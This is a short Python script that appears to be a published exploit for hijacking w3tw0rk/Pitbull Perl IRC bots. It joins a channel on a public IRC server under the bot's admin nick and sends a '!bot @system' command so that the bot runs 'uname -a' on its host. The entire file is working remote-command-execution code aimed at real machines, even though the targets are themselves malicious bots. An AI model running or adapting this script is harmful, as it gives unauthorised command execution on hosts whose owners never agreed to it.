# thehunter.py
# Pitbull / w3tw0rk Perl IRC Bot Remote Code Execution
# author: @shipcod3
# description: for taking over a w3tw0rk Perl IRC Bot by using the admin nick

import socket
import sys

#irc server connection settings
server = "us.dal.net" #irc server
channel = "#buhaypirata" #channel where the bot is located
botnick = "placeyouradminhere" #admin payload for taking over the w3wt0rk bot

irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #defines the socket
print "connecting to:"+server
irc.connect((server, 6667)) #connects to the server
irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :I eat w3tw0rk bots!\n") #user authentication
irc.send("NICK "+ botnick +"\n") #sets nick
irc.send("JOIN "+ channel +"\n") #join the chan
irc.send("PRIVMSG "+channel+" :!bot @system 'uname -a' \n") #send the payload to the bot

while 1:    #puts it in a loop
   text=irc.recv(2040)  #receive the text
   print text   #print text to console

   if text.find('PING') != -1:                          #check if 'PING' is found
      irc.send('PONG ' + text.split() [1] + '\r\n') #returnes 'PONG' back to the server (prevents pinging out!)
   if text.find('!quit') != -1: #quit the Bot
      irc.send ("QUIT\r\n") 
      sys.exit()
   if text.find('Linux') != -1:                         
      irc.send("PRIVMSG "+channel+" :The bot answers to "+botnick+" which allows command execution \r\n")
      irc.send ("QUIT\r\n")
      sys.exit()
